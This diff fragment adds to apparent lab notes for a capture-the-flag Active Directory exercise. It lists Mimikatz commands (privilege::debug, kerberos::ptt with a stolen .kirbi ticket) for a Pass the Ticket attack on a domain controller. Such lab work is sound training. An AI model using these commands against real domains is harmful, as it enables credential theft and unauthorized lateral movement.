@@ -253,3 +253,19 @@ Ticket was successfully imported!
 
 ![[Pasted image 20250822145603.png]]
 
+3) Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt
+
+### Mimikatz PtT via PowerShell Remoting
+
+
+```go
+mimikatz.exe
+```
+
+```go
+privilege::debug
+```
+
+```go
+kerberos::ptt "C:\john\john.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+```
